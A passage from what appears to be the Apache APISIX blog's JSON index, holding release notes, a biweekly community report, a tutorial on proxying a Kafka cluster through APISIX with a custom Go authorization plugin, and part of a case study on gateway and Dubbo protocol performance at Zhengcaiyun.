plugin to support selective viewing of timing by origin.\\n\\nFor more information, see [PR #9365](https://github.com/apache/apisix/pull/9365).\\n\\n### Support brotli compression algorithm\\n\\nSupport brotli compression algorithm in the new `brotli` plugin, which dynamically sets the behavior of [brotli in NGINX](https://github.com/google/ngx_brotli). Before using the plugin, you should first build and install brotli shared libraries.\\n\\nFor more information, see [PR #10515](https://github.com/apache/apisix/pull/10515) and [plugin documentation](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/brotli.md).\\n\\n### Expand capability of parameter parsing in `body-transformer` plugin\\n\\nSupport parsing parameters from POST requests of `application/x-www-form-urlencoded` content type and URI parameters from GET requests in `body-transformer` plugin.\\n\\nFor more information, see [PR #10496](https://github.com/apache/apisix/pull/10496).\\n\\n### Support the use of variables for sensitive information in `limit-count` plugin attributes\\n\\nSupport the use of variables for sensitive information in `limit-count` plugin attributes. For example, you could save `redis_password` to an environment variable and configure the value in the plugin as `$ENV://REDIS_PASSWORD`.\\n\\nFor more information, see [PR #10597](https://github.com/apache/apisix/pull/10597).\\n\\n## Other Updates\\n\\n- Improve performance with lua-resty-events module ([PR #10550](https://github.com/apache/apisix/pull/10550) and [PR #10558](https://github.com/apache/apisix/pull/10558))\\n- Upgrade OpenSSL 1.1.1 to OpenSSL 3 ([PR #10724](https://github.com/apache/apisix/pull/10724))\\n- Reduce the required number of `redis_cluster_nodes` from 2 to 1 in `limit-count` plugin  ([PR #10612](https://github.com/apache/apisix/pull/10612))\\n- Allow port to be an optional field when upstream nodes are of array type ([PR #10477](https://github.com/apache/apisix/pull/10477))\\n- Fix counter sharing among consumers when using the `limit-count` plugin ([PR #10540](https://github.com/apache/apisix/pull/10540))\\n- Add `redirect_after_logout_uri` attribute for `openid-connect` plugin, used when `end_session_endpoint` is not provided ([PR #10653](https://github.com/apache/apisix/pull/10653))\\n- Fix counter sharing among consumers when using the `limit-count` plugin ([PR #10540](https://github.com/apache/apisix/pull/10540))\\n- Fix `forward-auth` plugin 403 error when POST request body is too large ([PR #10589](https://github.com/apache/apisix/pull/10589))\\n\\n## Changelog\\n\\nFor a complete list of changes in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#380)."},{"id":"Biweekly Report (December 18 - December 31)","metadata":{"permalink":"/blog/2024/01/03/bi-weekly-report","source":"@site/blog/2024/01/03/bi-weekly-report.md","title":"Biweekly Report (December 18 - December 31)","description":"Our bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-01-03T00:00:00.000Z","formattedDate":"January 3, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.21,"truncated":true,"authors":[],"prevItem":{"title":"Release Apache APISIX 3.8.0","permalink":"/blog/2024/01/15/release-apache-apisix-3.8.0"},"nextItem":{"title":"Access the Kafka Cluster by APISIX Gateway","permalink":"/blog/2023/12/26/access-kafka-by-apisix"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. The updates include the `limit-count` plugin configuration supporting environment variables, the `response-rewrite` plugin supporting gzip when using the filters.regex option, and upgrading OpenSSL 1.1.1 to OpenSSL 3.0 version. For additional information, please consult the bi-weekly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'Many hands make light work\' rings true in our way, made possible by the collective dedication of our community.\\n\\nFrom 12.18 to 12.31, a total of 18 contributors made 32 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\nWe have recently added and enhanced several plugins, and here is a summary of the updates:\\n\\n1. The `limit-count` plugin configuration supports environment variables\\n\\n2. The `response-rewrite` plugin supports gzip when using the filters.regex option\\n\\n3. Upgrade OpenSSL 1.1.1 to OpenSSL 3.0 version\\n\\nOur bi-weekly Apache APISIX community report is your window into the project\'s weekly developments. It is a tool to facilitate your seamless integration into the Apache APISIX community, ensuring that you stay well-informed and actively involved.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/01/03/CPoS8MJV_Con.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/01/03/Cs8W4P1U_New.png)\\n\\n## Highlight of Recent Feature\\n\\n- [The `limit-count` plugin configuration supports environment variables](https://github.com/apache/apisix/pull/10607) (Contributor: [ikatlinsky](https://github.com/ikatlinsky))\\n\\n- [The `response-rewrite` plugin supports gzip when using the filters.regex option](https://github.com/apache/apisix/pull/10637) (Contributor: [yuweizzz](https://github.com/yuweizzz))\\n\\n- [Upgrade OpenSSL 1.1.1 to OpenSSL 3.0 version](https://github.com/apache/apisix/pull/10724) (Contributor: [AlinsRan](https://github.com/AlinsRan))\\n\\n## Recent Blog Recommendations\\n\\n- [Enhancing Security and Performance: DataVisor\'s Dynamic Use of APISIX](https://apisix.apache.org/blog/2023/12/19/datavisor-uses-apisix/)\\n\\n  Author: Xiaobiao Zhao, DataVisor Senior Architect, Apache Kvrocks Committer, OpenResty and Apache APISIX Contributor. This article is based on a presentation given by Xiaobiao Zhao at the APISIX Shanghai Meetup in November 2023.\\n  \\n- [Apache APISIX plugin priority, a leaky abstraction?](https://apisix.apache.org/blog/2023/12/14/apisix-plugins-priority-leaky-abstraction/)\\n\\n  Apache APISIX builds upon the OpenResty reverse-proxy to offer a plugin-based architecture. The main benefit of such an architecture is that it brings structure to the configuration of routes. It\'s a help at scale, when managing hundreds or thousands of routes.\\n\\n- [How to Supercharge Large-Scale Video Operations with APISIX](https://apisix.apache.org/blog/2023/12/14/migu-video-adopts-apisix/)\\n\\n  Author: Yu Xia, Senior DevOps Engineer at Migu Video Construction and Operation Center. This article is based on a presentation given by Yu Xia at the APISIX Shanghai Meetup in November 2023.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Access the Kafka Cluster by APISIX Gateway","metadata":{"permalink":"/blog/2023/12/26/access-kafka-by-apisix","source":"@site/blog/2023/12/26/access-kafka-by-apisix.md","title":"Access the Kafka Cluster by APISIX Gateway","description":"A few days ago, I added Apache APISIX as a proxy to an Apache Kafka cluster to manage authentication and authorization. Now, I created a custom authorization plugin in Go for the Kafka cluster.","date":"2023-12-26T00:00:00.000Z","formattedDate":"December 26, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.46,"truncated":true,"authors":[{"name":"Meng Yan","title":"Author","url":"https://github.com/yanmxa"}],"prevItem":{"title":"Biweekly Report (December 18 - December 31)","permalink":"/blog/2024/01/03/bi-weekly-report"},"nextItem":{"title":"Building a Robust \'Highway\' with APISIX: Gateway and Protocol Performance Optimization","permalink":"/blog/2023/12/26/zhengcaiyun-uses-apisix"}},"content":"> This blog shows how to use Apache APISIX to develop a customize authorization plugin for the kafka cluster.\\n\\n\x3c!--truncate--\x3e\\n\\n## Prerequisites\\n\\n- Have a running OpenShift cluster\\n- Run a Kafka cluster with [strimzi kafka operator](https://github.com/strimzi/strimzi-kafka-operator)\\n- Install [kubectl](https://kubernetes.io/docs/reference/kubectl), [OpenShift CLI](https://docs.openshift.com/container-platform/4.11/cli_reference/openshift_cli/getting-started-cli.html) and curl on host\\n\\n## Expose the Kafka Cluster by KafkaBridge\\n\\nTo simplify the configuration setting for the kafka. I provision the kafka by [strimzi-kafka-operator](https://github.com/strimzi/strimzi-kafka-operator). In order to make Kafka expose interfaces externally like other services, I use `KafkaBridge` to transform it into an HTTP service.\\n\\n- Create the `KafkaBridge`\\n\\n```bash\\n# namespace\\nKAFKA_NAMESPACE=kafka\\n\\n# create kafka bridge instance\\ncat <<EOF | oc apply -f -\\napiVersion: kafka.strimzi.io/v1beta2\\nkind: KafkaBridge\\nmetadata:\\n  name: strimzi-kafka-bridge\\n  namespace: ${KAFKA_NAMESPACE}\\nspec:\\n  bootstrapServers: kafka-kafka-bootstrap.${KAFKA_NAMESPACE}.svc:9092\\n  http:\\n    port: 8080\\n  replicas: 1\\nEOF\\n```\\n\\n- Verification\\n\\n```bash\\nKAFKA_NAMESPACE=kafka\\n# forward 8080 by bridge pod\\nkubectl -n ${KAFKA_NAMESPACE} port-forward $(kubectl get pods -l strimzi.io/cluster=strimzi-kafka-bridge -n ${KAFKA_NAMESPACE} -o jsonpath=\\"{.items[0].metadata.name}\\") 8080:8080\\n\\n# or forward 8080 by svc\\nkubectl -n ${KAFKA_NAMESPACE} port-forward svc/$(kubectl get svc -l strimzi.io/cluster=strimzi-kafka-bridge -n ${KAFKA_NAMESPACE} -o jsonpath=\\"{.items[0].metadata.name}\\") 8080:8080\\n\\n# list topic\\ncurl http://localhost:8080/topics\\n\\n# consume message with the consumer\\nwhile true; do curl -X GET http://localhost:8080/consumers/strimzi-kafka-consumer-group/instances/strimzi-kafka-consumer/records \\\\\\n-H \'accept: application/vnd.kafka.json.v2+json\'; sleep 1; done\\n```\\n\\n## Running APISIX on Openshift\\n\\n- Install APISIX on ROSA\\n\\n```bash\\noc create sa apisix-sa -n apisix\\noc adm policy add-scc-to-user anyuid -z apisix-sa -n apisix\\n\\nhelm install apisix apisix/apisix \\\\\\n  --set gateway.type=NodePort \\\\\\n  --set etcd.podSecurityContext.enabled=false \\\\\\n  --set etcd.containerSecurityContext.enabled=false \\\\\\n  --set serviceAccount.name=apisix-sa \\\\\\n  --namespace apisix\\n```\\n\\n- Configure the Kafka Route with Admin API\\n\\n```bash\\n# forward 9180 port to local host\\nkubectl -n apisix port-forward $(kubectl get pods -l app.kubernetes.io/name=apisix -n apisix -o jsonpath=\\"{.items[0].metadata.name}\\") 9180:9180\\n\\n# the bridge service name can be accessed by\\n# kubectl get svc -l strimzi.io/cluster=strimzi-kafka-bridge -n $KAFKA_NAMESPACE -o jsonpath=\\"{.items[0].metadata.name}\\"\\ncurl \\"http://127.0.0.1:9180/apisix/admin/routes/1\\" \\\\\\n-H \\"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\\" -X PUT -d \'\\n{\\n  \\"methods\\": [\\"GET\\", \\"POST\\", \\"DELETE\\", \\"PUT\\"],\\n  \\"host\\": \\"example.com\\",\\n  \\"uri\\": \\"/*\\",\\n  \\"plugins\\": {\\n    \\"ext-plugin-post-resp\\": {\\n      \\"conf\\": [\\n        {\\"name\\":\\"my-response-rewrite\\", \\"value\\":\\"{\\\\\\"tag\\\\\\":\\\\\\"\\\\\\"}\\"}\\n      ]\\n    }\\n  },\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"strimzi-kafka-bridge-bridge-service.kafka.svc:8080\\": 1\\n    }\\n  }\\n}\'\\n```\\n\\n- Request the Kafka Service with Client API\\n\\n```bash\\n# forward the http api of apisix to local host\\nkubectl -n apisix port-forward $(kubectl get pods -l app.kubernetes.io/name=apisix -n apisix -o jsonpath=\\"{.items[0].metadata.name}\\") 9080:9080\\n\\n# list topic\\ncurl --verbose --header \\"Host: example.com\\" http://localhost:9080/topics\\n\\n# send message to the topic\\ncurl --header \\"Host: example.com\\" --location \'http://localhost:9080/topics/event\' -H \'Content-Type: application/vnd.kafka.json.v2+json\' --data \\\\\\n\'{\\n   \\"records\\":[\\n      {\\n         \\"key\\":\\"event5\\",\\n         \\"value\\": \\"hello5\\"\\n      },\\n      {\\n         \\"key\\":\\"event6\\",\\n         \\"value\\": \\"world6\\"\\n      }\\n   ]\\n}\'\\n\\n# create a kafka consumer in a new consumer group\\ncurl --header \\"Host: example.com\\" -X POST http://localhost:9080/consumers/strimzi-kafka-consumer-group \\\\\\n  -H \'content-type: application/vnd.kafka.v2+json\' \\\\\\n  -d \'{\\n    \\"name\\": \\"strimzi-kafka-consumer\\",\\n    \\"auto.offset.reset\\": \\"earliest\\",\\n    \\"format\\": \\"json\\",\\n    \\"enable.auto.commit\\": true,\\n    \\"fetch.min.bytes\\": 512,\\n    \\"consumer.request.timeout.ms\\": 30000\\n  }\'\\n\\n# subscribe to the topic\\ncurl --header \\"Host: example.com\\" -X POST http://localhost:9080/consumers/strimzi-kafka-consumer-group/instances/strimzi-kafka-consumer/subscription \\\\\\n  -H \'content-type: application/vnd.kafka.v2+json\' \\\\\\n  -d \'{\\n    \\"topics\\": [\\n        \\"event\\"\\n    ]\\n}\'\\n\\n# consume message with the consumer\\nwhile true; do curl --header \\"Host: example.com\\" -X GET http://localhost:9080/consumers/strimzi-kafka-consumer-group/instances/strimzi-kafka-consumer/records \\\\\\n-H \'accept: application/vnd.kafka.json.v2+json\'; sleep 1; done\\n```\\n\\n## Develop an Authentication Plugin with Golang\\n\\n- Develop a validation plugin for the certificates\\n\\n  I develop the plugin leverage the [Go plugin runner](https://github.com/apache/apisix-go-plugin-runner). The plugin is just read the certificate from the header and then validate it. You can visit [this](https://github.com/yanmxa/apisix-go-plugin-runner/commit/84adcb2447287d48419c312f8aba8039c4b1f32d) for more detail.\\n\\n- Build the APISIX Image with the above Plugin\\n\\n```bash\\ngit clone git@github.com:apache/apisix-go-plugin-runner.git\\n# develop the plugin\\n...\\n# build binary\\nmake build\\n# create Dockerfile to add the build binary\\n`Dockerfile\\nFROM apache/apisix:3.6.0-debian\\nCOPY ./go-runner /usr/local/apisix/apisix-go-plugin-runner/go-runner\\n`\\n# build and push image\\ndocker build -f ./Dockerfile -t quay.io/myan/apisix-360-go:0.1 .\\ndocker push quay.io/myan/apisix-360-go:0.1\\n```\\n\\n- Startup the Plugin When Running the Server\\n\\n  Modify the `config.yaml` by `apisix` ConfigMap.\\n\\n```bash\\n  etcd:\\n    host:                # it\'s possible to define multiple etcd hosts addresses of the same etcd cluster.\\n      - \\"http://apisix-etcd.apisix.svc.cluster.local:2379\\"\\n    prefix: \\"/apisix\\"    # configuration prefix in etcd\\n    timeout: 30          # 30 seconds\\n...\\n# Nginx will hide all environment variables by default. So you need to declare your variable first in the conf/config.yaml\\n# https://github.com/apache/apisix/blob/master/docs/en/latest/external-plugin.md\\nnginx_config:\\n  envs:\\n    - APISIX_LISTEN_ADDRESS\\n    - APISIX_CONF_EXPIRE_TIME\\n\\next-plugin:\\n  # path_for_test: \\"/tmp/runner.sock\\"\\n  cmd: [\\"/usr/local/apisix/apisix-go-plugin-runner/go-runner\\", \\"run\\", \\"-m\\", \\"prod\\"]\\n```\\n\\n- Replace the APISIX Deployment Image\\n\\n```bash\\n# image: quay.io/myan/apisix-360-go:0.1\\nkubectl set image deployment/apisix apisix=quay.io/myan/apisix-360-go:0.1\\n```\\n\\n- Verification\\n\\n```bash\\n# set the certificate\\nCERT_CONTENT_BASE64=$(base64 < rest/client.crt)\\n\\n# list the topics\\ncurl -i \'http://127.0.0.1:9080/topics\' \\\\\\n-H \'Host: example.com\' \\\\\\n-H \'Content-Type: application/vnd.kafka.json.v2+json\' \\\\\\n-H \'Source: client\' \\\\\\n-H \\"Client-Certificate: $CERT_CONTENT_BASE64\\"\\n\\n# create consumer\\ncurl -X POST \'http://localhost:9080/consumers/strimzi-kafka-consumer-group\' \\\\\\n  -H \'Host: example.com\' \\\\\\n  -H \'Content-Type: application/vnd.kafka.json.v2+json\' \\\\\\n  -H \'Source: client\' \\\\\\n  -H \\"Client-Certificate: $CERT_CONTENT_BASE64\\" \\\\\\n  -d \'{\\n   \\"name\\": \\"strimzi-kafka-consumer\\",\\n   \\"auto.offset.reset\\": \\"earliest\\",\\n   \\"format\\": \\"json\\",\\n   \\"enable.auto.commit\\": true,\\n   \\"fetch.min.bytes\\": 512,\\n   \\"consumer.request.timeout.ms\\": 30000\\n}\'\\n\\n# subscribe topic event with the consumer group \'strimzi-kafka-consumer\'\\ncurl -X POST \'http://localhost:9080/consumers/strimzi-kafka-consumer-group/instances/strimzi-kafka-consumer/subscription\' \\\\\\n  -H \'Host: example.com\' \\\\\\n  -H \'Content-Type: application/vnd.kafka.json.v2+json\' \\\\\\n  -H \'Source: client\' \\\\\\n  -H \\"Client-Certificate: $CERT_CONTENT_BASE64\\" \\\\\\n  -d \'{\\n   \\"topics\\": [\\"event\\"]\\n}\'\\n\\n# consume message\\ncurl -X GET \'http://localhost:9080/consumers/strimzi-kafka-consumer-group/instances/strimzi-kafka-consumer/records\' \\\\\\n  -H \'Host: example.com\' \\\\\\n  -H \'Accept: application/vnd.kafka.json.v2+json\' \\\\\\n  -H \'Source: client\' \\\\\\n  -H \\"Client-Certificate: $CERT_CONTENT_BASE64\\" \\\\\\n```\\n\\n## References\\n\\n- [How to use go-plugin-runner with APISIX Ingress](https://apisix.apache.org/zh/docs/ingress-controller/tutorials/how-to-use-go-plugin-runner-in-apisix-ingress/)\\n- [How to use Go to develop Apache APISIX plugin](https://apisix.apache.org/blog/2021/08/19/go-makes-apache-apisix-better/)\\n- [APISIX\u4e4bGo\u63d2\u4ef6\u5f00\u53d1](https://zhuanlan.zhihu.com/p/613540331)\\n- [\u7ed3\u5408 casbin \u4e3a APISIX \u5f00\u53d1\u4e00\u4e2a\u63a5\u53e3\u6743\u9650\u6821\u9a8c\u63d2\u4ef6](https://www.fdevops.com/2022/10/09/casbin-apisix-31182)\\n- [Docker\u90e8\u7f72 apisix \u5e76\u4f7f\u7528golang\u63d2\u4ef6(\u81ea\u5b9a\u4e49\u9274\u6743\u65b9\u5f0f)](https://blog.csdn.net/weixin_42873928/article/details/123279381)"},{"id":"Building a Robust \'Highway\' with APISIX: Gateway and Protocol Performance Optimization","metadata":{"permalink":"/blog/2023/12/26/zhengcaiyun-uses-apisix","source":"@site/blog/2023/12/26/zhengcaiyun-uses-apisix.md","title":"Building a Robust \'Highway\' with APISIX: Gateway and Protocol Performance Optimization","description":"Author: Xiaobin Wang, Apache Dubbo Committer, Senior Development Engineer at Zhengcaiyun. This article is based on a presentation given by Xiaobin Wang at the APISIX Shanghai Meetup in November 2023.","date":"2023-12-26T00:00:00.000Z","formattedDate":"December 26, 2023","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":22.575,"truncated":true,"authors":[{"name":"Xiaobin Wang","title":"Author","url":"https://github.com/wxbty","image_url":"https://github.com/wxbty.png","imageURL":"https://github.com/wxbty.png"},{"name":"Jing Yan","title":"Technical Writer","url":"https://github.com/JYan00","image_url":"https://github.com/JYan00.png","imageURL":"https://github.com/JYan00.png"}],"prevItem":{"title":"Access the Kafka Cluster by APISIX Gateway","permalink":"/blog/2023/12/26/access-kafka-by-apisix"},"nextItem":{"title":"Biweekly Report (December 04 - December 17)","permalink":"/blog/2023/12/20/bi-weekly-report"}},"content":"> Author: Xiaobin Wang, Apache Dubbo Committer, Senior Development Engineer at Zhengcaiyun. This article is based on a presentation given by Xiaobin Wang at the APISIX Shanghai Meetup in November 2023.\\n\x3c!--truncate--\x3e\\n\\nIn tackling cross-network data challenges, Zhengcaiyun has constructed a \\"highway\\" based on Dubbo, with APISIX serving as the central gateway for network routing and supporting common features. This article delves into the optimization of gateway and protocol performance, addressing the specific challenges encountered during the construction of the \\"highway\\" project.\\n\\n## Background\\n\\nThe Zhengcaiyun platform serves as an exclusive hub for government procurement, catering to various government departments and state-owned enterprises. From a network architecture perspective, this platform forms a hybrid cloud network by integrating elements of public cloud, private cloud, and government cloud.\\n\\n![Zhengcaiyun_platform](https://static.apiseven.com/uploads/2023/12/26/Fw3u6Lp7_1.png)\\n\\nWhen Zhejiang governmental departments engage in procurement activities on the Zhengcaiyun platform, they are essentially utilizing the cloud-based operational framework. This cloud platform, situated in Zhejiang, forms a microservices network system. It serves as a platform that the company independently deploys and manages. Beyond Zhejiang, several other provinces also leverage the cloud platform for their procurement needs.\\n\\nMoreover, the platform extends its services to branch offices established in different provinces, each having distinct requirements. These branch offices deploy the same microservices framework, adapting to the administrative divisions of their respective provinces but operating within the local environment. Additionally, non-administrative entities, like banks, may opt for private deployment.\\n\\nAll these microservices collectively form a segment of the hybrid cloud network. Consequently, cross-network data transmission becomes a common scenario for the business.\\n\\nIn response to this demand, Zhengcaiyun initiated the \\"highway\\" project in late 2022. The project aimed to consolidate existing network transmission solutions, providing a unified, user-friendly, and high-speed cross-network business experience. As the integration of cross-network solutions progresses, an increasing portion of the company\'s cross-network traffic is directed toward this novel infrastructure.\\n\\n## \\"Highway\\" Project\\n\\nThe \\"highway\\" project unfolds in three distinctive phases. The initial phase sees the deployment of the \\"highway\\" project based on Dubbo. Subsequently, the second phase consolidates prior solutions into the new framework. The third and final phase aims to address challenges emerging from the initial phases and undertake further refinements.\\n\\nIn the initial phase, a pioneering architecture was designed using Dubbo, with APISIX playing a central role. Each node represents an island, signifying different provinces or other administrative divisions. Interestingly, the cloud platform itself serves as a unique island, and our platform encompassed multiple such islands, collectively forming a hybrid cloud network.\\n\\n![Highway_structure1](https://static.apiseven.com/uploads/2023/12/26/fId3VYse_2.jpg)\\n\\nWhy did we choose the star-shaped network architecture for this project? The need for cross-network communication existed right from the inception of Zhengcaiyun. In the early days, business operations involved point-to-point data transfers across networks, eventually leading to the formation of a mesh architecture. Previously, we had various projects and solutions related to cross-network operations\u2014some provided by the foundational platform and others developed independently by businesses. The primary goal of the current \\"Highway\\" project is to integrate these solutions, establish a unified technical foundation, reduce individual operational costs, and streamline processes. This allows businesses to concentrate on their core activities while incorporating more common features.\\n\\nDeveloping individual solutions for each business could lead to functional limitations as they would only focus on their specific areas. On the other hand, opening up business operations for others might introduce challenges, such as the need to support custom features that the business itself does not prioritize.\\n\\nThe star-shaped architecture of the \\"Highway\\" is the outcome of this integration. In the previous mesh structure, interconnecting each island required a series of intricate processes. For instance, coordinating with the operations and maintenance teams in provinces like Shanxi and Shanghai, having them open specific ports, deploying services based on those ports, and establishing network interactions. This resulted in numerous complex lines within the mesh structure. With n islands, there could be approximately n squared lines. The star-shaped architecture simplifies this, avoiding the intricacies of pairwise connections found in the earlier mesh structure.\\n\\n## Challenges\\n\\nAfter the successful trial of new business in the first half of 2023 under the \\"Highway\\" project, we initiated the gradual migration of historical cross-network solutions in the latter half of the year. Monitoring revealed increased pressure from the growing traffic, evidenced by:\\n\\n* **Frequent alerts from the heartbeat application:** To ensure the stability of the highway, we deployed a universal heartbeat application on each segment, responsible for network interconnectivity. This application triggers alerts if any issues arise. For instance, if requests slow down within a specific timeframe, exceeding 1 second per request, we promptly receive alerts. Monitoring indicated a frequent occurrence of alerts from the heartbeat application.\\n\\n* **Declines in monitoring metrics such as response time (RT) and throughput:** We also employed the Prometheus-formatted BRAF interface for monitoring. On this interface, certain response volume and throughput curves exhibited a noticeable downward trend.\\n\\nThe pressure in these two aspects gradually manifested as we transitioned historical solutions into the \\"Highway\\" project, coupled with the increasing traffic volume.\\n\\nTo ensure the stability of our business operations and enhance the overall user experience, we have implemented a range of optimization strategies. Broadly speaking, our efforts have centered around three key approaches:\\n\\n![Optimization_solutions](https://static.apiseven.com/uploads/2024/01/29/xThKSktL_3_1.jpg)\\n\\n* **Resource Optimization:** This step involves the relatively straightforward reallocation of resources. We have taken specific measures, such as isolating resources for single points like the central gateway and Dubbo gateway, aiming to minimize the impact of potential failures on the overall system. Additionally, actions like directly increasing the number of pods and upgrading CPUs have proven effective in alleviating pressure. While these measures ensure ample resource reserves to meet high-load demands, it is important to note that this approach does not address fundamental architectural shortcomings. If certain resources cannot be horizontally scaled due to such limitations, issues may persist under specific conditions and might not be promptly resolved.\\n  \\n* **Performance Optimization:** This approach necessitates a deep dive into architectural optimizations to mitigate the shortcomings identified by the bucket model. Maximizing performance utilization is paramount for achieving system-wide horizontal scalability.\\n\\n* **Best Practices Guidance:** Recognizing that each framework has its limitations, we have actively guided users to avoid operations that could potentially lead to issues. In instances where users insist on certain operations, we provide informed advice. For instance, the Dubbo framework, used for cross-network transmission, defaults to supporting high traffic but with small requests concurrency. The high-speed highway built on Dubbo exhibits similar characteristics. We have advised users against transmitting large files through Dubbo, as it could exert significant pressure on our system. Instead, we recommend alternative methods for file transmission.\\n\\nBy adopting a holistic approach that combines resource readiness, performance optimization, and user guidance for sensible operations, we have ensured the stability and high availability of our system.\\n\\n## Issues and Goals\\n\\n### The Process of Cross-Network RPC Requests\\n\\n![Highway_structure2](https://static.apiseven.com/uploads/2023/12/26/Ij2SKNMh_4.jpg)\\n\\nIn our system, particularly between Provinces A and B, we often encounter the necessity for cross-network RPC requests. These requests might span various provinces and their respective microservices architectures. Despite each province sharing an essentially identical set of codes in Clusters A and B, housing both APP1 and APP2, differences arise. Certain islands may exclude APP2, like the file service unnecessary in third-tier cities, resulting in its non-deployment. Cross-network needs, such as accessing the SMS service, highlight the indispensability of certain components.\\n\\nWhen APP1 initiates a call to APP2, the standard scenario involves local cluster invocation in the absence of routing information. However, our innovation lies in the introduction of the \\"Highway\\" SDK in APP1. This SDK empowers APP1 to embed routing information during Dubbo calls, which can assume diverse formats. Consequently, we gain the capability to specify the destination of the request. For instance, Province B.\\n\\nThe SDK in APP1 orchestrates the redirection of traffic to Cluster A\'s Dubbo gateway. Subsequently, the Dubbo gateway transforms the Dubbo request into an HTTP request, directing it to APISIX within the novel network architecture. APISIX, in turn, forwards the HTTP request to the intended service.\\n\\nUpon receiving the request, APISIX initiates the parsing of routing information, identifying the necessity to redirect it to Province B. Subsequently, APISIX dispatches the request to the Dubbo gateway of Province B. Here, the Dubbo gateway in Province B, armed with routing insights, parameters, requests, and serialization protocols, employs Dubbo\'s generic call once more. Ultimately, the request finds its way to APP2 in Province B.\\n\\n### The Significance of Dubbo Gateway\\n\\nDuring this process, questions regarding the necessity of a Dubbo gateway might arise. The Dubbo gateway\'s function revolves around transforming protocol data into HTTP, and is it plausible to skip the Dubbo gateway and directly route requests to the central gateway?\\n\\nUnderstanding why a Dubbo gateway is indispensable involves considering several factors. Firstly, the Dubbo gateway plays a crucial role in translating data from the Dubbo protocol to the HTTP protocol. While skipping this step might appear to save a single operation in some instances, it involves critical IP convergence and feature convergence tasks. These tasks are intricately linked to the features of the initial version. Moreover, the implementation of the Dubbo gateway has some shortcomings. It operates as a Java-based Spring Boot program and introduces the Dubbo SDK. When an APP\'s request undergoes a transition and there is no corresponding provider, Dubbo defaults to returning a \\"Service not found\\" error, akin to HTTP\'s \\"404 not found.\\"\\n\\nTo address this concern, we took the initiative to enhance Dubbo. Through tailored development of the source code, we empowered Dubbo to forward requests and contributed these enhancements to the Dubbo community.\\n\\n### Gateways in the Comprehensive Architecture\\n\\nWithin the comprehensive architecture, three gateways are employed, consisting of a central gateway and two Dubbo gateways. The central gateway utilizes APISIX, a tool previously employed in the first version of the \\"Highway\\" project. Its primary function involves executing routing (reverse proxy) and directing requests to clusters in various networks based on HTTP Header information. While using APISIX, certain challenges were faced, particularly related to the Dashboard. For example, issues arose when attempting to export route configurations from the test environment to the production environment, leading to errors in the Dashboard. In essence, the utilization of APISIX in this context aligns with standard gateway scenarios.\\n\\n## Performance Analysis of Cross-Network RPC\\n\\n![RPC_analysis](https://static.apiseven.com/uploads/2024/01/29/vW9R6PGC_5_1.jpg)\\n\\n* **Client:** The client is already equipped with Dubbo\'s SDK, which encompasses proxy generation, method invocation, parameter serialization, and initiating network requests. Altering this component is currently challenging due to our adoption of a unified Dubbo, ensuring the stability of the SDK\'s behavior remains unchanged.\\n\\n* **Local Network:** Transitioning traffic within the local cluster involves Dubbo\'s transport mechanism. This entails considerations like I/O models, the Dubbo protocol, and data formats (e.g., parameters). Dubbo utilizes a Netty-based asynchronous non-blocking I/O model, perfectly aligning with its performance requirements. The Dubbo protocol adopts a straightforward and adaptable structure for data packets, efficiently encoding and decoding data in binary format based on specific needs.\\n\\n* **Dubbo Gateway:** In this process, the Dubbo gateway acts as a traffic-forwarding entity, without the responsibility of handling business logic. It brings forth considerations related to the I/O model of message reception: choosing between blocking or asynchronous message reception. Additionally, it involves packet parsing, incurring some costs as Dubbo data transforms HTTP data, including serialization and deserialization. There are also custom extensions based on the local cluster, incorporating common features like rate limiting and authentication.\\n\\n* **Public Gateway:** Post-gateway request processing, the flow is directed to APISIX\'s central gateway through HTTP, utilizing HttpClient for outward-bound journeys. As HttpClient is inherently blocking, it might exhibit slightly inadequate performance. The decision to build our gateway rather than adopting existing solutions was primarily driven by the urgency to implement quickly in the first version, with performance optimization deferred as subsequent work. Yet, a significant challenge arises in this approach due to the unique process of converting the Dubbo protocol to HTTP. Currently, no gateway supports this specific custom behavior. Consequently, we decided to tackle this challenge with a self-developed solution, utilizing a Netty-based Java application. When it comes to the public network, considerations include I/O models, HTTP protocols, and data formats, all of which led us to choose the high-performance APISIX.\\n\\n* **Central Gateway:** In the broader architecture, APISIX, as the central gateway, plays a pivotal role, especially in facilitating company-level common functions. It is responsible for efficient traffic handling, forwarding, and supporting common extensions. With the central gateway becoming a single point in the new network architecture, concerns related to single-point failures are duly addressed. Our current strategy regards common extensions as company-level functions, allowing for extensions at this level, such as traffic interception and execution of corresponding operations. The plugin-based features of APISIX empower us to make additional extensions, for example, discouraging unordered cross-domain calls and conducting audits only after console-registered information (e.g., app name, responsible person, etc.) verification. In addressing single-point failure concerns, we have implemented fault isolation and resource isolation in the central gateway. We maintain stringent requirements for stability and scalability, both of which are well met by APISIX.\\n\\n* **Cluster Target:** Following central gateway request forwarding, the process aligns closely with the preceding local network scenario. Since it is a midpoint call, the form may vary slightly. Due to a series of operations, the Dubbo data packet is now encapsulated via HTTP. After parsing, it can\'t undergo point-to-point calls and still requires Dubbo\'s generic invocation. Understanding the interface name, parameters, etc., then proceeds with the call, returning along the original path.\\n\\n## Optimization Objective: Boosting Throughput\\n\\n![Optimization_goal](https://static.apiseven.com/uploads/2023/12/26/rcuQEhy0_6.png)\\n\\nPerformance testing was carried out before the initial version of the architecture went live to 